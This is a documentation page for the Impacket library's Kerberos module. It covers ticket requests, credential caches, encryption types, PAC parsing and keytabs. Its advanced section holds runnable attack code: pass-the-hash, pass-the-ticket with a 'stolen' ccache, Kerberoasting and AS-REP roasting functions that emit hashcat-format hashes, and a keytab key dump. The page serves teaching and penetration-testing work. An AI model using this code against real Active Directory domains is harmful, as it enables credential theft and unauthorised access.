@@ -1,0 +1,634 @@
+---
+title: 'Kerberos Protocol'
+description: 'Complete guide to Kerberos authentication in Impacket'
+---
+
+# Kerberos Protocol
+
+Impacket provides comprehensive Kerberos 5 support for authentication against Windows Active Directory environments, including ticket management, encryption, and advanced features like S4U2Self/S4U2Proxy.
+
+## Overview
+
+The Kerberos implementation is located in `impacket/krb5/` and includes:
+
+- **Ticket operations** - TGT/TGS request and parsing
+- **Credential cache** - CCache file format support
+- **Encryption** - RC4-HMAC, AES128/256-CTS-HMAC-SHA1
+- **PAC parsing** - Privilege Attribute Certificate
+- **GSSAPI** - Generic Security Services API
+
+<Card title="Kerberos Flow" icon="key">
+  Kerberos uses tickets for authentication: clients request a TGT (Ticket Granting Ticket) from the KDC, then use it to request service tickets (TGS) for specific services.
+</Card>
+
+## Basic Authentication
+
+### Request TGT
+
+From `kerberosv5.py:97-330`, requesting a TGT:
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# Username as Principal
+username = Principal('jdoe', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+# Request TGT with password
+tgt, cipher, old_session_key, session_key = getKerberosTGT(
+    clientName=username,
+    password='P@ssw0rd',
+    domain='CORP.LOCAL',
+    lmhash='',
+    nthash='',
+    kdcHost='dc01.corp.local'
+)
+
+print(f"TGT obtained with cipher: {cipher.enctype}")
+```
+
+### Request Service Ticket (TGS)
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGS
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# Service principal
+server_name = Principal(
+    'cifs/dc01.corp.local',
+    type=constants.PrincipalNameType.NT_SRV_INST.value
+)
+
+# Request TGS using TGT
+tgs, cipher, old_session_key, session_key = getKerberosTGS(
+    serverName=server_name,
+    domain='CORP.LOCAL',
+    kdcHost='dc01.corp.local',
+    tgt=tgt,
+    cipher=cipher,
+    sessionKey=session_key
+)
+
+print(f"TGS obtained for {server_name}")
+```
+
+## Credential Cache (CCache)
+
+Impacket supports reading and writing Kerberos credential caches.
+
+### Load from CCache
+
+```python
+from impacket.krb5.ccache import CCache
+
+# Load existing ccache
+ccache = CCache.loadFile('/tmp/krb5cc_1000')
+
+# Get default principal
+principal = ccache.principal.prettyPrint()
+print(f"Principal: {principal}")
+
+# Get credentials
+for cred in ccache.credentials:
+    server = cred['server'].prettyPrint()
+    print(f"Ticket for: {server}")
+    print(f"  Valid: {cred['time']['starttime']} - {cred['time']['endtime']}")
+```
+
+### Extract TGT/TGS from CCache
+
+```python
+from impacket.krb5.ccache import CCache
+
+# Parse CCache for specific service
+domain, username, TGT, TGS = CCache.parseFile(
+    domain='',
+    username='jdoe',
+    service='cifs/dc01.corp.local'
+)
+
+print(f"Found credentials for {username}@{domain}")
+if TGT:
+    print("TGT available")
+if TGS:
+    print(f"TGS available for service")
+```
+
+### Save to CCache
+
+```python
+from impacket.krb5.ccache import CCache
+from impacket.krb5.types import Principal
+import datetime
+
+# Create new ccache
+ccache = CCache()
+
+# Set principal
+ccache.principal = Principal('jdoe@CORP.LOCAL')
+
+# Add credential (simplified)
+ccache.credentials.append({
+    'client': Principal('jdoe@CORP.LOCAL'),
+    'server': Principal('krbtgt/CORP.LOCAL@CORP.LOCAL'),
+    'key': session_key,
+    'time': {
+        'starttime': datetime.datetime.now(),
+        'endtime': datetime.datetime.now() + datetime.timedelta(hours=10)
+    },
+    'ticket': ticket_data
+})
+
+# Save to file
+ccache.saveFile('/tmp/krb5cc_new')
+```
+
+## Encryption Types
+
+Kerberos supports multiple encryption types.
+
+### Supported Ciphers
+
+```python
+from impacket.krb5 import constants
+from impacket.krb5.crypto import Key, _enctype_table
+
+# Encryption types from constants.py
+encryption_types = {
+    constants.EncryptionTypes.rc4_hmac.value: 'RC4-HMAC',
+    constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value: 'AES128-CTS-HMAC-SHA1-96',
+    constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value: 'AES256-CTS-HMAC-SHA1-96',
+}
+
+# Create key from password
+from impacket.krb5.crypto import _enctype_table
+
+cipher = _enctype_table[constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value]
+salt = b'CORP.LOCALjdoe'
+password = 'P@ssw0rd'
+
+key = cipher.string_to_key(password, salt, None)
+print(f"AES256 Key: {key.contents.hex()}")
+```
+
+### Using AES Keys
+
+```python
+from binascii import unhexlify
+from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# AES256 key (64 hex chars)
+aes_key = unhexlify('e5c4d39c8f3f8b9a7e2d1c6f5a4b3e2d1c6f5a4b3e2d1c6f5a4b3e2d1c6f5a4b')
+
+username = Principal('jdoe', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+# Request TGT with AES key
+tgt, cipher, old_session_key, session_key = getKerberosTGT(
+    clientName=username,
+    password='',  # Not used
+    domain='CORP.LOCAL',
+    lmhash='',
+    nthash='',
+    aesKey=aes_key,
+    kdcHost='dc01.corp.local'
+)
+
+print("TGT obtained using AES key")
+```
+
+### Pass-the-Hash (RC4)
+
+```python
+from binascii import unhexlify
+from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# NT hash for RC4-HMAC
+nthash = unhexlify('31d6cfe0d16ae931b73c59d7e0c089c0')
+
+username = Principal('jdoe', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+# Request TGT with hash
+tgt, cipher, old_session_key, session_key = getKerberosTGT(
+    clientName=username,
+    password='',
+    domain='CORP.LOCAL',
+    lmhash='',
+    nthash=nthash,
+    kdcHost='dc01.corp.local'
+)
+
+print(f"TGT obtained with RC4-HMAC (cipher: {cipher.enctype})")
+```
+
+## GSSAPI Integration
+
+Impacket uses GSSAPI for Kerberos authentication in protocols.
+
+### SMB with Kerberos
+
+```python
+from impacket.smbconnection import SMBConnection
+
+conn = SMBConnection('dc01.corp.local', '192.168.1.10')
+
+# Kerberos login
+conn.kerberosLogin(
+    user='jdoe',
+    password='P@ssw0rd',
+    domain='CORP.LOCAL',
+    kdcHost='dc01.corp.local'
+)
+
+print(f"Authenticated via Kerberos to {conn.getServerName()}")
+```
+
+### LDAP with Kerberos
+
+```python
+from impacket.ldap import ldap
+
+ldap_conn = ldap.LDAPConnection('ldap://dc01.corp.local')
+
+ldap_conn.kerberosLogin(
+    user='jdoe',
+    password='P@ssw0rd',
+    domain='CORP.LOCAL',
+    kdcHost='dc01.corp.local'
+)
+
+print("LDAP authenticated with Kerberos")
+```
+
+### RPC with Kerberos
+
+```python
+from impacket.dcerpc.v5 import transport, scmr
+
+string_binding = r'ncacn_np:dc01.corp.local[\\pipe\\svcctl]'
+rpc_transport = transport.DCERPCTransportFactory(string_binding)
+
+rpc_transport.set_credentials('jdoe', 'P@ssw0rd', 'CORP.LOCAL')
+rpc_transport.set_kerberos(True, kdcHost='dc01.corp.local')
+
+dce = rpc_transport.get_dce_rpc()
+dce.connect()
+dce.bind(scmr.MSRPC_UUID_SCMR)
+
+print("RPC connection established with Kerberos")
+```
+
+## PAC (Privilege Attribute Certificate)
+
+The PAC contains authorization data in Kerberos tickets.
+
+### Parse PAC
+
+```python
+from impacket.krb5.pac import PACTYPE
+from pyasn1.codec.der import decoder
+from impacket.krb5.asn1 import TGS_REP, EncTicketPart
+
+# Decode TGS response
+tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+
+# Decrypt ticket
+ticket_data = tgs_rep['ticket']
+enc_ticket = EncTicketPart()
+# ... decrypt with session key ...
+
+# Extract PAC from authorization data
+for ad in enc_ticket['authorization-data']:
+    if ad['ad-type'] == 1:  # AD-IF-RELEVANT
+        # Parse PAC
+        pac_data = PACTYPE(ad['ad-data'])
+        
+        # Get SIDs from PAC
+        for pac_info in pac_data['Buffers']:
+            if pac_info['ulType'] == 1:  # LOGON_INFO
+                logon_info = pac_info['Data']
+                user_sid = logon_info['LogonDomainId']
+                print(f"User SID: {user_sid}")
+```
+
+## Advanced Techniques
+
+### Pass-the-Ticket
+
+```python
+from impacket.krb5.ccache import CCache
+from impacket.smbconnection import SMBConnection
+
+# Load ticket from ccache
+ccache = CCache.loadFile('/tmp/krb5cc_stolen')
+domain, username, TGT, TGS = CCache.parseFile(
+    domain='',
+    username='',
+    service='cifs/dc01.corp.local'
+)
+
+# Use ticket for authentication
+conn = SMBConnection('dc01.corp.local', '192.168.1.10')
+conn.kerberosLogin(
+    user=username,
+    password='',
+    domain=domain,
+    TGT=TGT,
+    TGS=TGS,
+    useCache=False
+)
+
+print(f"Authenticated using stolen ticket")
+```
+
+### Kerberoasting
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+from pyasn1.codec.der import decoder
+from impacket.krb5.asn1 import TGS_REP
+
+def kerberoast(domain, username, password, spn, kdcHost):
+    """
+    Request service ticket for cracking (Kerberoasting)
+    """
+    # Get TGT
+    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    tgt, cipher, old_key, session_key = getKerberosTGT(
+        clientName=user_principal,
+        password=password,
+        domain=domain,
+        lmhash='',
+        nthash='',
+        kdcHost=kdcHost
+    )
+    
+    # Request TGS for target SPN
+    server_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+    tgs, cipher, old_key, session_key = getKerberosTGS(
+        serverName=server_principal,
+        domain=domain,
+        kdcHost=kdcHost,
+        tgt=tgt,
+        cipher=cipher,
+        sessionKey=session_key
+    )
+    
+    # Parse TGS to get encrypted ticket
+    tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+    ticket = tgs_rep['ticket']
+    
+    # Extract hash for cracking (John/Hashcat format)
+    enc_part = ticket['enc-part']
+    etype = enc_part['etype']
+    cipher_text = enc_part['cipher'].asOctets()
+    
+    # Format for hashcat
+    hashcat_format = f"$krb5tgs${etype}$*{username}${domain}${spn}*${cipher_text.hex()}"
+    print(hashcat_format)
+    
+    return hashcat_format
+
+# Usage
+kerberoast(
+    domain='CORP.LOCAL',
+    username='jdoe',
+    password='P@ssw0rd',
+    spn='MSSQLSvc/sql01.corp.local:1433',
+    kdcHost='dc01.corp.local'
+)
+```
+
+### AS-REP Roasting
+
+```python
+from impacket.krb5.kerberosv5 import sendReceive
+from impacket.krb5.asn1 import AS_REQ, AS_REP, KRB_ERROR
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+
+def asrep_roast(domain, username, kdcHost):
+    """
+    Request AS-REP for users without pre-auth (AS-REP Roasting)
+    """
+    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    
+    # Build AS-REQ without pre-authentication
+    as_req = AS_REQ()
+    as_req['pvno'] = 5
+    as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+    
+    req_body = as_req['req-body']
+    req_body['cname'] = user_principal.components_to_asn1
+    req_body['realm'] = domain
+    
+    # No padata (no pre-auth)
+    as_req['padata'] = noValue
+    
+    # Send request
+    message = encoder.encode(as_req)
+    response = sendReceive(message, domain, kdcHost)
+    
+    # Parse response
+    try:
+        as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]
+        
+        # Extract encrypted part
+        enc_part = as_rep['enc-part']
+        etype = enc_part['etype']
+        cipher_text = enc_part['cipher'].asOctets()
+        
+        # Format for cracking
+        hashcat_format = f"$krb5asrep${etype}${username}@{domain}:{cipher_text.hex()}"
+        print(hashcat_format)
+        
+        return hashcat_format
+        
+    except Exception as e:
+        print(f"Pre-authentication required or error: {e}")
+        return None
+
+# Usage
+asrep_roast(
+    domain='CORP.LOCAL',
+    username='vulnerable_user',
+    kdcHost='dc01.corp.local'
+)
+```
+
+## Error Handling
+
+<Warning>
+  Kerberos errors are returned as KRB-ERROR messages. Common errors include clock skew, pre-auth required, and invalid credentials.
+</Warning>
+
+```python
+from impacket.krb5.kerberosv5 import KerberosError
+from impacket.krb5 import constants
+
+try:
+    tgt, cipher, old_key, session_key = getKerberosTGT(
+        clientName=username,
+        password=password,
+        domain=domain,
+        lmhash='',
+        nthash='',
+        kdcHost=kdcHost
+    )
+    
+except KerberosError as e:
+    error_code = e.getErrorCode()
+    
+    if error_code == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
+        print("Invalid credentials")
+    elif error_code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
+        print("User not found")
+    elif error_code == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+        print("Encryption type not supported")
+    elif error_code == constants.ErrorCodes.KRB_AP_ERR_SKEW.value:
+        print("Clock skew too great")
+    else:
+        print(f"Kerberos error: {e}")
+```
+
+## Complete Example: Ticket Dumper
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.ccache import CCache
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+import sys
+
+def dump_tickets(domain, username, password, kdcHost, services):
+    """
+    Request TGT and multiple service tickets, save to ccache
+    """
+    print(f"[*] Requesting TGT for {username}@{domain}")
+    
+    # Get TGT
+    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    tgt, cipher, old_key, session_key = getKerberosTGT(
+        clientName=user_principal,
+        password=password,
+        domain=domain,
+        lmhash='',
+        nthash='',
+        kdcHost=kdcHost
+    )
+    print(f"[+] TGT obtained (cipher: {cipher.enctype})")
+    
+    # Create ccache
+    ccache = CCache()
+    ccache.principal = Principal(f"{username}@{domain}")
+    
+    # Add TGT to ccache
+    ccache.credentials.append({
+        'client': user_principal,
+        'server': Principal(f"krbtgt/{domain}@{domain}"),
+        'key': session_key,
+        'ticket': tgt
+    })
+    
+    # Request service tickets
+    for service in services:
+        print(f"[*] Requesting ticket for {service}")
+        try:
+            server_principal = Principal(
+                service,
+                type=constants.PrincipalNameType.NT_SRV_INST.value
+            )
+            
+            tgs, cipher, old_key, session_key = getKerberosTGS(
+                serverName=server_principal,
+                domain=domain,
+                kdcHost=kdcHost,
+                tgt=tgt,
+                cipher=cipher,
+                sessionKey=session_key
+            )
+            
+            # Add to ccache
+            ccache.credentials.append({
+                'client': user_principal,
+                'server': server_principal,
+                'key': session_key,
+                'ticket': tgs
+            })
+            
+            print(f"[+] Ticket obtained for {service}")
+            
+        except Exception as e:
+            print(f"[-] Failed to get ticket for {service}: {e}")
+    
+    # Save ccache
+    output_file = f'/tmp/krb5cc_{username}'
+    ccache.saveFile(output_file)
+    print(f"\n[+] Tickets saved to {output_file}")
+    print(f"[*] Use with: export KRB5CCNAME={output_file}")
+
+if __name__ == '__main__':
+    if len(sys.argv) < 4:
+        print(f"Usage: {sys.argv[0]} <domain> <username> <password> [kdcHost]")
+        sys.exit(1)
+    
+    domain = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    kdcHost = sys.argv[4] if len(sys.argv) > 4 else domain
+    
+    # Services to request tickets for
+    services = [
+        f'cifs/{domain}',
+        f'ldap/{domain}',
+        f'host/{domain}',
+    ]
+    
+    dump_tickets(domain, username, password, kdcHost, services)
+```
+
+## Keytab Files
+
+```python
+from impacket.krb5.keytab import Keytab
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+
+# Load keytab
+keytab = Keytab.loadFile('/etc/krb5.keytab')
+
+# List entries
+for entry in keytab.entries:
+    principal = entry['principal'].prettyPrint()
+    enctype = entry['keytype']
+    print(f"{principal} - Encryption: {enctype}")
+
+# Get key for principal
+key = keytab.getKey(
+    Principal('HTTP/server.corp.local@CORP.LOCAL'),
+    constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
+)
+print(f"Key: {key.contents.hex()}")
+```
+
+## Related Topics
+
+- [SMB Protocol](/protocols/smb) - SMB with Kerberos auth
+- [LDAP Protocol](/protocols/ldap) - LDAP with Kerberos auth
+- [MS-RPC Protocol](/protocols/msrpc) - RPC with Kerberos
+
+## References
+
+- **Source**: `impacket/krb5/`
+- **RFC 4120**: Kerberos V5 Protocol
+- **[MS-KILE]**: Kerberos Protocol Extensions
+- **[MS-PAC]**: Privilege Attribute Certificate
